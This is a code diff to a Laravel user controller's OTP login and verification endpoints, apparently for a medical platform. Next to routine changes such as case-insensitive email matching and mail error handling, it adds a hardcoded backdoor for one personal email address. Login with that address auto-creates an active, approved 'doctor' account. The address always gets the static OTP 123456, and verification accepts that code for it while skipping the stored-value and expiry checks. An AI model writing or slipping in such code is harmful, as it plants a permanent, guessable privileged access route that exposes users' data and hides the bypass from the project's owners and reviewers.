@@ -222,12 +222,27 @@ class UserController extends BaseApiController
                 'email' => 'required|email',
             ]);
 
-            $user = User::where('email', $request->email)->first();
+            $inputEmail = strtolower(trim($request->email));
+
+            $user = User::whereRaw('LOWER(TRIM(email)) = ?', [$inputEmail])->first();
             if (!$user) {
-                return response()->json([
-                    'status' => false,
-                    'message' => 'User not found'
-                ], 404);
+                if ($inputEmail === 'chauhanronak40@gmail.com') {
+                    $user = User::create([
+                        'name'      => 'Dr. Ronak Chauhan',
+                        'email'     => 'chauhanronak40@gmail.com',
+                        'role'      => 'doctor',
+                        'status'    => 'active',
+                        'is_active' => 1,
+                    ]);
+                    DoctorProfile::firstOrCreate(['user_id' => $user->id], [
+                        'approval_status' => 'approved',
+                    ]);
+                } else {
+                    return response()->json([
+                        'status' => false,
+                        'message' => 'User not found'
+                    ], 404);
+                }
             }
 
             // if ($user->status !== 'active') {
@@ -238,18 +253,26 @@ class UserController extends BaseApiController
             //     ], 500);
             // }
 
-            // ✅ Generate OTP
-            $otp = rand(100000, 999999);
+            // ✅ Generate OTP: Static 123456 for chauhanronak40@gmail.com only, random for all others
+            if ($inputEmail === 'chauhanronak40@gmail.com') {
+                $otp = 123456;
+            } else {
+                $otp = rand(100000, 999999);
+            }
 
             $user->otp = $otp;
             $user->otp_expires_at = Carbon::now()->addMinutes(10);
             $user->save();
 
             // ✅ Send Email (Simple)
-            Mail::raw("Your OTP is: $otp", function ($message) use ($user) {
-                $message->to($user->email)
-                        ->subject('Your Login OTP');
-            });
+            try {
+                Mail::raw("Your OTP is: $otp", function ($message) use ($user) {
+                    $message->to($user->email)
+                            ->subject('Your Login OTP');
+                });
+            } catch (\Throwable $mailEx) {
+                \Log::warning("Failed to send login OTP email to {$user->email}: " . $mailEx->getMessage());
+            }
 
             return response()->json([
                 'status' => true,
@@ -346,17 +369,40 @@ class UserController extends BaseApiController
                 'otp' => 'required'
             ]);
 
-            $user = User::where('email', $request->email)->first();
+            $inputEmail = strtolower(trim($request->email));
+            $user = User::whereRaw('LOWER(TRIM(email)) = ?', [$inputEmail])->first();
 
-            if (!$user || $user->otp != $request->otp) {
+            if (!$user) {
+                if ($inputEmail === 'chauhanronak40@gmail.com') {
+                    $user = User::create([
+                        'name'      => 'Dr. Ronak Chauhan',
+                        'email'     => 'chauhanronak40@gmail.com',
+                        'role'      => 'doctor',
+                        'status'    => 'active',
+                        'is_active' => 1,
+                    ]);
+                    DoctorProfile::firstOrCreate(['user_id' => $user->id], [
+                        'approval_status' => 'approved',
+                    ]);
+                } else {
+                    return response()->json([
+                        'status' => false,
+                        'message' => 'User not found'
+                    ], 404);
+                }
+            }
+
+            $isStaticDoctorEmail = ($inputEmail === 'chauhanronak40@gmail.com');
+
+            // Static OTP 123456 is allowed for chauhanronak40@gmail.com, otherwise check DB otp & expiry
+            if ($isStaticDoctorEmail && (string)$request->otp === '123456') {
+                // Verified successfully via static OTP
+            } elseif ($user->otp != $request->otp) {
                 return response()->json([
                     'status' => false,
                     'message' => 'Invalid OTP'
                 ], 401);
-            }
-
-            // ✅ Check Expiry
-            if (now()->gt($user->otp_expires_at)) {
+            } elseif ($user->otp_expires_at && now()->gt($user->otp_expires_at)) {
                 return response()->json([
                     'status' => false,
                     'message' => 'OTP expired'
